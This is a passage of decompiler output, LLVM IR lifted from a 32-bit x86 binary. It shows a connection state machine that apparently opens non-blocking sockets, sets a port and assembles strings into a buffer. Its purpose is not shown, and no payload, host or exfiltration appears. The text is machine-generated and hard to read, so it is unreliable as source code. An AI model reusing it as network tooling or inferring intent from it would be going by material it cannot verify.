  store i1 %v6_804851f, i1* %zf.global-to-local, align 1
  store i32 %v1_804851f, i32* @esi, align 4
  %v1_8048525 = add i32 %v0_804850c, 116
  %v2_8048525 = inttoptr i32 %v1_8048525 to i32*
  store i32 0, i32* %v2_8048525, align 4
  %v0_804852d = load i32, i32* @esp, align 4
  %v1_804852d = add i32 %v0_804852d, 72
  %v2_804852d = inttoptr i32 %v1_804852d to i32*
  store i32 0, i32* %v2_804852d, align 4
  br label %dec_label_pc_80485a5

dec_label_pc_8048537:                             ; preds = %dec_label_pc_80485b6
  %v10_8048537 = icmp eq i8 %v3_80485a5, 2
  store i1 %v10_8048537, i1* %zf.global-to-local, align 1
  br i1 %v10_8048537, label %dec_label_pc_8048c9d, label %dec_label_pc_804853f

dec_label_pc_804853f:                             ; preds = %dec_label_pc_8048537
  %v10_804853f = icmp eq i8 %v3_80485a5, 4
  store i1 %v10_804853f, i1* %zf.global-to-local, align 1
  br i1 %v10_804853f, label %dec_label_pc_8048700, label %dec_label_pc_8048547

dec_label_pc_8048547:                             ; preds = %dec_label_pc_804853f
  %v10_8048547 = icmp eq i8 %v3_80485a5, 6
  store i1 %v10_8048547, i1* %zf.global-to-local, align 1
  br i1 %v10_8048547, label %dec_label_pc_80493a7, label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_8048547
  %v10_804854f = icmp eq i8 %v3_80485a5, 7
  store i1 %v10_804854f, i1* %zf.global-to-local, align 1
  br i1 %v10_804854f, label %dec_label_pc_8049773, label %dec_label_pc_8048557

dec_label_pc_8048557:                             ; preds = %dec_label_pc_804854f
  %v10_8048557 = icmp eq i8 %v3_80485a5, 10
  store i1 %v10_8048557, i1* %zf.global-to-local, align 1
  br i1 %v10_8048557, label %dec_label_pc_8049829, label %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge

dec_label_pc_8048557.dec_label_pc_804855f_crit_edge: ; preds = %dec_label_pc_8048557
  %v0_804855f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804855f

dec_label_pc_804855f:                             ; preds = %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge, %dec_label_pc_8048c9d
  %v0_804855f = phi i32 [ %v0_804855f.pre, %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge ], [ %v0_8048c9d, %dec_label_pc_8048c9d ]
  %v9_804855f = icmp eq i32 %v0_804855f, 12
  store i1 %v9_804855f, i1* %zf.global-to-local, align 1
  %v1_8048562 = add i32 %v0_80485a5, -1440
  %v2_8048562 = inttoptr i32 %v1_8048562 to i32*
  %v3_8048562 = load i32, i32* %v2_8048562, align 4
  store i32 %v3_8048562, i32* %edx.global-to-local, align 4
  store i8 0, i8* %v2_80485a5, align 1
  %v0_804856f = load i32, i32* %edx.global-to-local, align 4
  %v1_804856f = load i32, i32* @esp, align 4
  %v2_804856f = add i32 %v1_804856f, -4
  %v3_804856f = inttoptr i32 %v2_804856f to i32*
  store i32 %v0_804856f, i32* %v3_804856f, align 4
  %v1_8048570 = call i32 @function_80521e1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048570, i32* %eax.global-to-local, align 4
  %v0_8048575 = load i32, i32* @esi, align 4
  %v1_8048575 = add i32 %v0_8048575, -1440
  %v2_8048575 = inttoptr i32 %v1_8048575 to i32*
  store i32 -1, i32* %v2_8048575, align 4
  %v0_804857f = load i32, i32* @esp, align 4
  %v6_804857f = icmp eq i32 %v0_804857f, -16
  store i1 %v6_804857f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048582

dec_label_pc_8048582:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_8048601, %dec_label_pc_804861f, %dec_label_pc_80486e4, %dec_label_pc_804855f
  %v0_8048582 = load i32, i32* @esp, align 4
  %v1_8048582 = add i32 %v0_8048582, 100
  %v2_8048582 = inttoptr i32 %v1_8048582 to i32*
  %v3_8048582 = load i32, i32* %v2_8048582, align 4
  %v0_8048586 = load i32, i32* @ebp, align 4
  %v1_8048586 = add i32 %v0_8048586, 3140
  store i32 %v1_8048586, i32* @ebp, align 4
  %v1_804858c = add i32 %v3_8048582, 1
  store i32 %v1_804858c, i32* %eax.global-to-local, align 4
  %v0_804858d = load i32, i32* @esi, align 4
  %v1_804858d = add i32 %v0_804858d, 3140
  store i32 %v1_804858d, i32* @esi, align 4
  store i32 %v1_804858c, i32* %v2_8048582, align 4
  %v0_8048597 = load i32, i32* @esp, align 4
  %v1_8048597 = add i32 %v0_8048597, 100
  %v2_8048597 = inttoptr i32 %v1_8048597 to i32*
  %v3_8048597 = load i32, i32* %v2_8048597, align 4
  store i32 %v3_8048597, i32* @ecx, align 4
  %v1_804859b = add i32 %v0_8048597, 112
  %v2_804859b = inttoptr i32 %v1_804859b to i32*
  %v3_804859b = load i32, i32* %v2_804859b, align 4
  %v15_804859b = icmp eq i32 %v3_804859b, %v3_8048597
  store i1 %v15_804859b, i1* %zf.global-to-local, align 1
  br i1 %v15_804859b, label %dec_label_pc_8048cdd, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_8048582, %dec_label_pc_8048517
  %v0_80485a5 = load i32, i32* @esi, align 4
  %v1_80485a5 = add i32 %v0_80485a5, -1436
  %v2_80485a5 = inttoptr i32 %v1_80485a5 to i8*
  %v3_80485a5 = load i8, i8* %v2_80485a5, align 1
  %v4_80485a5 = zext i8 %v3_80485a5 to i32
  %v5_80485a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80485a5 = and i32 %v5_80485a5, -256
  %v7_80485a5 = or i32 %v6_80485a5, %v4_80485a5
  store i32 %v7_80485a5, i32* %eax.global-to-local, align 4
  %v0_80485ab = load i32, i32* @ebp, align 4
  %v1_80485ab = add i32 %v0_80485ab, -16
  store i32 %v1_80485ab, i32* @edi, align 4
  %v6_80485ae = icmp eq i8 %v3_80485a5, 0
  %v10_80485ae = icmp eq i8 %v3_80485a5, 1
  store i1 %v10_80485ae, i1* %zf.global-to-local, align 1
  br i1 %v10_80485ae, label %dec_label_pc_80486ee, label %dec_label_pc_80485b6

dec_label_pc_80485b6:                             ; preds = %dec_label_pc_80485a5
  store i1 %v6_80485ae, i1* %zf.global-to-local, align 1
  %v1_80485b8 = icmp eq i1 %v6_80485ae, false
  br i1 %v1_80485b8, label %dec_label_pc_8048537, label %dec_label_pc_80485be

dec_label_pc_80485be:                             ; preds = %dec_label_pc_80485b6, %dec_label_pc_8048c91
  %v0_80485be = load i32, i32* @esp, align 4
  %v1_80485be = add i32 %v0_80485be, 20868
  %v2_80485be = inttoptr i32 %v1_80485be to i32*
  store i32 0, i32* %v2_80485be, align 4
  %v0_80485c9 = load i32, i32* @esp, align 4
  %v1_80485c9 = add i32 %v0_80485c9, 20872
  %v2_80485c9 = inttoptr i32 %v1_80485c9 to i32*
  store i32 0, i32* %v2_80485c9, align 4
  %v0_80485d4 = load i32, i32* @esp, align 4
  %v1_80485d4 = add i32 %v0_80485d4, 20876
  %v2_80485d4 = inttoptr i32 %v1_80485d4 to i32*
  store i32 0, i32* %v2_80485d4, align 4
  %v0_80485df = load i32, i32* @esp, align 4
  %v1_80485df = add i32 %v0_80485df, 20880
  %v2_80485df = inttoptr i32 %v1_80485df to i32*
  store i32 0, i32* %v2_80485df, align 4
  %v0_80485ea = load i32, i32* @esi, align 4
  %v1_80485ea = add i32 %v0_80485ea, -1440
  %v2_80485ea = inttoptr i32 %v1_80485ea to i32*
  %v3_80485ea = load i32, i32* %v2_80485ea, align 4
  store i32 %v3_80485ea, i32* %eax.global-to-local, align 4
  %v10_80485f0 = icmp eq i32 %v3_80485ea, -1
  store i1 %v10_80485f0, i1* %zf.global-to-local, align 1
  %v1_8048601.pre = load i32, i32* @esp, align 4
  br i1 %v10_80485f0, label %dec_label_pc_8048601, label %dec_label_pc_80485f5

dec_label_pc_80485f5:                             ; preds = %dec_label_pc_80485be
  %v9_80485f5 = icmp eq i32 %v1_8048601.pre, 12
  store i1 %v9_80485f5, i1* %zf.global-to-local, align 1
  %v2_80485f8 = add i32 %v1_8048601.pre, -16
  %v3_80485f8 = inttoptr i32 %v2_80485f8 to i32*
  store i32 %v3_80485ea, i32* %v3_80485f8, align 4
  %v1_80485f9 = call i32 @function_80521e1(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80485f9, i32* %eax.global-to-local, align 4
  %v0_80485fe = load i32, i32* @esp, align 4
  %v1_80485fe = add i32 %v0_80485fe, 16
  %v6_80485fe = icmp eq i32 %v1_80485fe, 0
  store i1 %v6_80485fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485be, %dec_label_pc_80485f5
  %v1_8048601 = phi i32 [ %v1_80485fe, %dec_label_pc_80485f5 ], [ %v1_8048601.pre, %dec_label_pc_80485be ]
  %v0_8048601 = load i32, i32* @ecx, align 4
  %v2_8048601 = add i32 %v1_8048601, -4
  %v3_8048601 = inttoptr i32 %v2_8048601 to i32*
  store i32 %v0_8048601, i32* %v3_8048601, align 4
  %v1_8048602 = add i32 %v1_8048601, -8
  %v2_8048602 = inttoptr i32 %v1_8048602 to i32*
  store i32 0, i32* %v2_8048602, align 4
  %v1_8048604 = add i32 %v1_8048601, -12
  %v2_8048604 = inttoptr i32 %v1_8048604 to i32*
  store i32 1, i32* %v2_8048604, align 4
  %v1_8048606 = add i32 %v1_8048601, -16
  %v2_8048606 = inttoptr i32 %v1_8048606 to i32*
  store i32 2, i32* %v2_8048606, align 4
  %v3_8048608 = call i32 @function_80529d5(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048608, i32* %eax.global-to-local, align 4
  %v1_8048610 = load i32, i32* @esi, align 4
  %v2_8048610 = add i32 %v1_8048610, -1440
  %v3_8048610 = inttoptr i32 %v2_8048610 to i32*
  store i32 %v3_8048608, i32* %v3_8048610, align 4
  %v10_8048616 = icmp eq i32 %v3_8048608, -1
  store i1 %v10_8048616, i1* %zf.global-to-local, align 1
  br i1 %v10_8048616, label %dec_label_pc_8048582, label %dec_label_pc_804861f

dec_label_pc_804861f:                             ; preds = %dec_label_pc_8048601
  %v0_804861f = load i32, i32* @edx, align 4
  %v1_804861f = load i32, i32* @esp, align 4
  %v2_804861f = add i32 %v1_804861f, -4
  %v3_804861f = inttoptr i32 %v2_804861f to i32*
  store i32 %v0_804861f, i32* %v3_804861f, align 4
  %v1_8048620 = add i32 %v1_804861f, -8
  %v2_8048620 = inttoptr i32 %v1_8048620 to i32*
  store i32 0, i32* %v2_8048620, align 4
  %v1_8048622 = add i32 %v1_804861f, -12
  %v2_8048622 = inttoptr i32 %v1_8048622 to i32*
  store i32 3, i32* %v2_8048622, align 4
  %v2_8048624 = add i32 %v1_804861f, -16
  %v3_8048624 = inttoptr i32 %v2_8048624 to i32*
  store i32 %v3_8048608, i32* %v3_8048624, align 4
  %v3_8048625 = call i32 @function_805211d(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804862a = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804862d = or i32 %v3_8048625, 2048
  store i32 %v12_804862d, i32* %eax.global-to-local, align 4
  %v2_8048630 = add i32 %v0_804862a, 8
  %v3_8048630 = inttoptr i32 %v2_8048630 to i32*
  store i32 %v12_804862d, i32* %v3_8048630, align 4
  %v1_8048631 = add i32 %v0_804862a, 4
  %v2_8048631 = inttoptr i32 %v1_8048631 to i32*
  store i32 4, i32* %v2_8048631, align 4
  %v0_8048633 = load i32, i32* @esi, align 4
  %v1_8048633 = add i32 %v0_8048633, -1440
  %v2_8048633 = inttoptr i32 %v1_8048633 to i32*
  %v3_8048633 = load i32, i32* %v2_8048633, align 4
  store i32 %v3_8048633, i32* %eax.global-to-local, align 4
  %v3_8048639 = inttoptr i32 %v0_804862a to i32*
  store i32 %v3_8048633, i32* %v3_8048639, align 4
  %v3_804863a = call i32 @function_805211d(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804863f = load i32, i32* @esp, align 4
  %v1_804863f = add i32 %v0_804863f, 20916
  store i32 %v1_804863f, i32* %eax.global-to-local, align 4
  %v2_8048646 = inttoptr i32 %v1_804863f to i32*
  store i32 65535, i32* %v2_8048646, align 4
  %v0_8048651 = load i32, i32* @esp, align 4
  %v1_8048651 = inttoptr i32 %v0_8048651 to i32*
  store i32 4, i32* %v1_8048651, align 4
  %v0_8048658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048658 = load i32, i32* @esp, align 4
  %v2_8048658 = add i32 %v1_8048658, -4
  %v3_8048658 = inttoptr i32 %v2_8048658 to i32*
  store i32 %v0_8048658, i32* %v3_8048658, align 4
  %v1_8048659 = add i32 %v1_8048658, -8
  %v2_8048659 = inttoptr i32 %v1_8048659 to i32*
  store i32 8, i32* %v2_8048659, align 4
  %v1_804865b = add i32 %v1_8048658, -12
  %v2_804865b = inttoptr i32 %v1_804865b to i32*
  store i32 0, i32* %v2_804865b, align 4
  %v0_804865d = load i32, i32* @esi, align 4
  %v1_804865d = add i32 %v0_804865d, -1440
  %v2_804865d = inttoptr i32 %v1_804865d to i32*
  %v3_804865d = load i32, i32* %v2_804865d, align 4
  store i32 %v3_804865d, i32* %eax.global-to-local, align 4
  %v2_8048663 = add i32 %v1_8048658, -16
  %v3_8048663 = inttoptr i32 %v2_8048663 to i32*
  store i32 %v3_804865d, i32* %v3_8048663, align 4
  %v5_8048664 = call i32 @function_805299a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048664, i32* %eax.global-to-local, align 4
  %v0_8048669 = load i32, i32* @esi, align 4
  %v1_8048669 = add i32 %v0_8048669, -1424
  %v2_8048669 = inttoptr i32 %v1_8048669 to i32*
  %v3_8048669 = load i32, i32* %v2_8048669, align 4
  store i32 %v3_8048669, i32* %eax.global-to-local, align 4
  %v0_804866f = load i32, i32* @esp, align 4
  %v1_804866f = add i32 %v0_804866f, 112
  %v2_804866f = inttoptr i32 %v1_804866f to i32*
  %v3_804866f = load i32, i32* %v2_804866f, align 4
  store i32 %v3_804866f, i32* %edx.global-to-local, align 4
  %v2_8048673 = add i32 %v0_804866f, 20904
  %v3_8048673 = inttoptr i32 %v2_8048673 to i32*
  store i32 %v3_8048669, i32* %v3_8048673, align 4
  %v0_804867a = load i32, i32* @esp, align 4
  %v1_804867a = add i32 %v0_804867a, 20900
  %v2_804867a = inttoptr i32 %v1_804867a to i16*
  store i16 2, i16* %v2_804867a, align 2
  %v0_8048684 = load i32, i32* @esp, align 4
  %v1_8048684 = add i32 %v0_8048684, 102
  %v2_8048684 = inttoptr i32 %v1_8048684 to i16*
  %v3_8048684 = load i16, i16* %v2_8048684, align 2
  %v5_8048684 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048684 = and i32 %v5_8048684, -65536
  %v0_8048689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048689 = load i32, i32* @esi, align 4
  %v2_8048689 = add i32 %v1_8048689, -1432
  %v3_8048689 = inttoptr i32 %v2_8048689 to i32*
  store i32 %v0_8048689, i32* %v3_8048689, align 4
  %v2_804868f = call i16 @llvm.bswap.i16(i16 %v3_8048684)
  %v3_804868f = zext i16 %v2_804868f to i32
  %v6_804868f = or i32 %v3_804868f, %v6_8048684
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v2_8048693 = load i32, i32* @esp, align 4
  %v3_8048693 = add i32 %v2_8048693, 20902
  %v4_8048693 = inttoptr i32 %v3_8048693 to i16*
  store i16 %v2_804868f, i16* %v4_8048693, align 2
  %v0_804869b = load i32, i32* @esp, align 4
  %v9_804869b = icmp eq i32 %v0_804869b, -28
  store i1 %v9_804869b, i1* %zf.global-to-local, align 1
  %v0_804869e = load i32, i32* @esi, align 4
  %v1_804869e = add i32 %v0_804869e, -1436
  %v2_804869e = inttoptr i32 %v1_804869e to i8*
  store i8 2, i8* %v2_804869e, align 1
  %v0_80486a5 = load i32, i32* @esp, align 4
  %v1_80486a5 = add i32 %v0_80486a5, -4
  %v2_80486a5 = inttoptr i32 %v1_80486a5 to i32*
  store i32 16, i32* %v2_80486a5, align 4
  %v1_80486a7 = add i32 %v0_80486a5, 20872
  store i32 %v1_80486a7, i32* %ecx.global-to-local, align 4
  %v2_80486ae = add i32 %v0_80486a5, -8
  %v3_80486ae = inttoptr i32 %v2_80486ae to i32*
  store i32 %v1_80486a7, i32* %v3_80486ae, align 4
  %v0_80486af = load i32, i32* @esi, align 4
  %v1_80486af = add i32 %v0_80486af, -1440
  %v2_80486af = inttoptr i32 %v1_80486af to i32*
  %v3_80486af = load i32, i32* %v2_80486af, align 4
  store i32 %v3_80486af, i32* @edi, align 4
  %v2_80486b5 = add i32 %v0_80486a5, -12
  %v3_80486b5 = inttoptr i32 %v2_80486b5 to i32*
  store i32 %v3_80486af, i32* %v3_80486b5, align 4
  %v3_80486b6 = call i32 @function_80527fa(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esi, align 4
  %v1_80486bb = add i32 %v0_80486bb, -1440
  %v2_80486bb = inttoptr i32 %v1_80486bb to i32*
  %v3_80486bb = load i32, i32* %v2_80486bb, align 4
  %v1_80486c3 = urem i32 %v3_80486bb, 32
  store i32 %v1_80486c3, i32* %eax.global-to-local, align 4
  %v2_80486c6 = udiv i32 %v3_80486bb, 32
  store i32 %v2_80486c6, i32* %edx.global-to-local, align 4
  %v0_80486c9 = load i32, i32* @esp, align 4
  %v2_80486c9 = mul nuw nsw i32 %v2_80486c6, 4
  %v3_80486c9 = add nuw nsw i32 %v2_80486c9, 20628
  %v4_80486c9 = add i32 %v3_80486c9, %v0_80486c9
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  %v6_80486c9 = load i32, i32* %v5_80486c9, align 4
  %v9_80486c9 = shl i32 1, %v1_80486c3
  %v12_80486c9 = or i32 %v6_80486c9, %v9_80486c9
  store i32 %v12_80486c9, i32* %v5_80486c9, align 4
  %v0_80486d1 = load i32, i32* @esp, align 4
  %v1_80486d1 = add i32 %v0_80486d1, 16
  %v0_80486d4 = load i32, i32* @esi, align 4
  %v1_80486d4 = add i32 %v0_80486d4, -1440
  %v2_80486d4 = inttoptr i32 %v1_80486d4 to i32*
  %v3_80486d4 = load i32, i32* %v2_80486d4, align 4
  store i32 %v3_80486d4, i32* %eax.global-to-local, align 4
  %v1_80486da = add i32 %v0_80486d1, 88
  %v2_80486da = inttoptr i32 %v1_80486da to i32*
  %v3_80486da = load i32, i32* %v2_80486da, align 4
  %v5_80486da = sub i32 %v3_80486da, %v3_80486d4
  %v11_80486da = xor i32 %v3_80486da, %v3_80486d4
  %v12_80486da = xor i32 %v5_80486da, %v3_80486da
  %v13_80486da = and i32 %v12_80486da, %v11_80486da
  %v14_80486da = icmp slt i32 %v13_80486da, 0
  %v15_80486da = icmp eq i32 %v5_80486da, 0
  store i1 %v15_80486da, i1* %zf.global-to-local, align 1
  %v16_80486da = icmp slt i32 %v5_80486da, 0
  %v2_80486de = icmp eq i1 %v16_80486da, %v14_80486da
  br i1 %v2_80486de, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80486e4:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_804861f
  %v1_80486e5 = phi i32 [ %v1_8049845, %dec_label_pc_8049829 ], [ %v1_804978f, %dec_label_pc_8049773 ], [ %v1_80493c3, %dec_label_pc_80493a7 ], [ %v0_8048cce, %dec_label_pc_8048cb2 ], [ %v1_8048c79, %dec_label_pc_8048c28 ], [ %v1_80486d1, %dec_label_pc_804861f ]
  %v0_80486e4 = phi i32 [ %v3_804983f, %dec_label_pc_8049829 ], [ %v3_8049789, %dec_label_pc_8049773 ], [ %v3_80493bd, %dec_label_pc_80493a7 ], [ %v3_8048cc8, %dec_label_pc_8048cb2 ], [ %v3_8048c7c, %dec_label_pc_8048c28 ], [ %v3_80486d4, %dec_label_pc_804861f ]
  %v1_80486e4 = add i32 %v0_80486e4, 1
  %v8_80486e4 = icmp eq i32 %v1_80486e4, 0
  store i1 %v8_80486e4, i1* %zf.global-to-local, align 1
  store i32 %v1_80486e4, i32* %eax.global-to-local, align 4
  %v2_80486e5 = add i32 %v1_80486e5, 72
  %v3_80486e5 = inttoptr i32 %v2_80486e5 to i32*
  store i32 %v1_80486e4, i32* %v3_80486e5, align 4
  br label %dec_label_pc_8048582

dec_label_pc_80486ee:                             ; preds = %dec_label_pc_80485a5
  %v1_80486ee = add i32 %v0_80485a5, 16
  %v2_80486ee = inttoptr i32 %v1_80486ee to i32*
  %v3_80486ee = load i32, i32* %v2_80486ee, align 4
  store i32 %v3_80486ee, i32* @ebx, align 4
  %v1_80486f1 = icmp eq i32 %v3_80486ee, 0
  store i1 %v1_80486f1, i1* %zf.global-to-local, align 1
  br i1 %v1_80486f1, label %dec_label_pc_8048c91, label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486ee
  store i8 4, i8* %v2_80485a5, align 1
  %v0_8048700.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %dec_label_pc_804853f, %dec_label_pc_80486f9
  %v0_8048700 = phi i32 [ %v0_80485a5, %dec_label_pc_804853f ], [ %v0_8048700.pre, %dec_label_pc_80486f9 ]
  %v1_8048700 = add i32 %v0_8048700, 24
  %v2_8048700 = inttoptr i32 %v1_8048700 to i32*
  store i32 -1, i32* %v2_8048700, align 4
  %v0_8048707 = load i32, i32* @esi, align 4
  %v1_8048707 = add i32 %v0_8048707, 12
  %v2_8048707 = inttoptr i32 %v1_8048707 to i32*
  store i32 0, i32* %v2_8048707, align 4
  %v0_804870e = load i32, i32* @edi, align 4
  %v1_804870e = add i32 %v0_804870e, 2116
  store i32 %v1_804870e, i32* @eax, align 4
  %v0_8048714 = load i32, i32* @ecx, align 4
  %v1_8048714 = load i32, i32* @esp, align 4
  %v2_8048714 = add i32 %v1_8048714, -4
  %v3_8048714 = inttoptr i32 %v2_8048714 to i32*
  store i32 %v0_8048714, i32* %v3_8048714, align 4
  %v0_8048715 = load i32, i32* @ecx, align 4
  %v2_8048715 = add i32 %v1_8048714, -8
  %v3_8048715 = inttoptr i32 %v2_8048715 to i32*
  store i32 %v0_8048715, i32* %v3_8048715, align 4
  %v1_8048716 = add i32 %v1_8048714, -12
  %v2_8048716 = inttoptr i32 %v1_8048716 to i32*
  store i32 1024, i32* %v2_8048716, align 4
  %v0_804871b = load i32, i32* @eax, align 4
  %v2_804871b = add i32 %v1_8048714, -16
  %v3_804871b = inttoptr i32 %v2_804871b to i32*
  store i32 %v0_804871b, i32* %v3_804871b, align 4
  %v2_804871c = call i32 @function_8051cd0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804871c, i32* %eax.global-to-local, align 4
  %v0_8048721 = load i32, i32* @esi, align 4
  %v1_8048721 = add i32 %v0_8048721, 672
  %v2_8048721 = inttoptr i32 %v1_8048721 to i32*
  store i32 0, i32* %v2_8048721, align 4
  %v0_804872b = load i32, i32* @esp, align 4
  %v1_804872b = inttoptr i32 %v0_804872b to i32*
  %v2_804872b = load i32, i32* %v1_804872b, align 4
  store i32 %v2_804872b, i32* %eax.global-to-local, align 4
  %v3_804872b = add i32 %v0_804872b, 4
  %v1_804872c = inttoptr i32 %v3_804872b to i32*
  %v2_804872c = load i32, i32* %v1_804872c, align 4
  store i32 %v2_804872c, i32* %edx.global-to-local, align 4
  store i32 10240, i32* %v1_804872c, align 4
  %v1_8048732 = add i32 %v0_804872b, 10388
  store i32 %v1_8048732, i32* @eax, align 4
  store i32 %v1_8048732, i32* %v1_804872b, align 4
  %v2_804873a = call i32 @function_8051cd0(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804873a, i32* %eax.global-to-local, align 4
  %v0_804873f = load i32, i32* @edi, align 4
  %v1_804873f = add i32 %v0_804873f, 1431
  store i32 %v1_804873f, i32* %edx.global-to-local, align 4
  %v1_8048745 = load i32, i32* @esp, align 4
  %v2_8048745 = add i32 %v1_8048745, 112
  %v3_8048745 = inttoptr i32 %v2_8048745 to i32*
  store i32 %v1_804873f, i32* %v3_8048745, align 4
  %v0_8048749 = load i32, i32* @esp, align 4
  %v1_8048749 = inttoptr i32 %v0_8048749 to i32*
  %v2_8048749 = load i32, i32* %v1_8048749, align 4
  store i32 %v2_8048749, i32* %eax.global-to-local, align 4
  %v1_804874a = add i32 %v0_8048749, 10388
  store i32 %v1_804874a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804874a, i32* %v1_8048749, align 4
  %v2_8048752 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048752, i32* %eax.global-to-local, align 4
  %v0_8048757 = load i32, i32* @esp, align 4
  %v1_8048757 = inttoptr i32 %v0_8048757 to i32*
  %v2_8048757 = load i32, i32* %v1_8048757, align 4
  store i32 %v2_8048757, i32* %ecx.global-to-local, align 4
  %v3_8048757 = add i32 %v0_8048757, 4
  %v1_8048758 = inttoptr i32 %v3_8048757 to i32*
  %v2_8048758 = load i32, i32* %v1_8048758, align 4
  store i32 %v2_8048758, i32* @ebx, align 4
  %v1_8048759 = add i32 %v0_8048757, 112
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  %v3_8048759 = load i32, i32* %v2_8048759, align 4
  store i32 %v3_8048759, i32* %v1_8048758, align 4
  %v1_804875e = add i32 %v0_8048757, 10388
  store i32 %v1_804875e, i32* %edx.global-to-local, align 4
  %v2_8048765 = add i32 %v1_804875e, %v2_8048752
  store i32 %v2_8048765, i32* %eax.global-to-local, align 4
  store i32 %v2_8048765, i32* %v1_8048757, align 4
  %v3_8048769 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048769, i32* %eax.global-to-local, align 4
  %v0_804876e = load i32, i32* @esp, align 4
  %v1_804876e = inttoptr i32 %v0_804876e to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* @ebx, align 4
  %v1_804876f = add i32 %v0_804876e, 10388
  store i32 %v1_804876f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804876f, i32* %v1_804876e, align 4
  %v2_8048777 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = inttoptr i32 %v0_804877c to i32*
  %v2_804877c = load i32, i32* %v1_804877c, align 4
  store i32 %v2_804877c, i32* %edx.global-to-local, align 4
  %v3_804877c = add i32 %v0_804877c, 4
  %v1_804877d = inttoptr i32 %v3_804877c to i32*
  %v2_804877d = load i32, i32* %v1_804877d, align 4
  store i32 %v2_804877d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054aff.7 to i32), i32* %v1_804877d, align 4
  %v1_8048783 = add i32 %v0_804877c, 10388
  store i32 %v1_8048783, i32* %edx.global-to-local, align 4
  %v2_804878a = add i32 %v1_8048783, %v2_8048777
  store i32 %v2_804878a, i32* %eax.global-to-local, align 4
  store i32 %v2_804878a, i32* %v1_804877c, align 4
  %v3_804878e = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804878e, i32* %eax.global-to-local, align 4
  %v0_8048793 = load i32, i32* @esp, align 4
  %v1_8048793 = inttoptr i32 %v0_8048793 to i32*
  %v2_8048793 = load i32, i32* %v1_8048793, align 4
  store i32 %v2_8048793, i32* @ebx, align 4
  %v1_8048794 = add i32 %v0_8048793, 10388
  store i32 %v1_8048794, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048794, i32* %v1_8048793, align 4
  %v2_804879c = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_804879c, i32* %eax.global-to-local, align 4
  %v0_80487a1 = load i32, i32* @esp, align 4
  %v1_80487a1 = inttoptr i32 %v0_80487a1 to i32*
  %v3_80487a1 = add i32 %v0_80487a1, 4
  %v0_80487a2 = load i32, i32* @edi, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 532
  store i32 %v1_80487a2, i32* %edx.global-to-local, align 4
  %v1_80487a8 = inttoptr i32 %v3_80487a1 to i32*
  %v2_80487a8 = load i32, i32* %v1_80487a8, align 4
  store i32 %v2_80487a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487a2, i32* %v1_80487a8, align 4
  %v1_80487aa = add i32 %v0_80487a1, 10388
  store i32 %v1_80487aa, i32* %edx.global-to-local, align 4
  %v2_80487b1 = add i32 %v1_80487aa, %v2_804879c
  store i32 %v2_80487b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b1, i32* %v1_80487a1, align 4
  %v3_80487b5 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487b5, i32* %eax.global-to-local, align 4
  %v0_80487ba = load i32, i32* @esp, align 4
  %v1_80487ba = inttoptr i32 %v0_80487ba to i32*
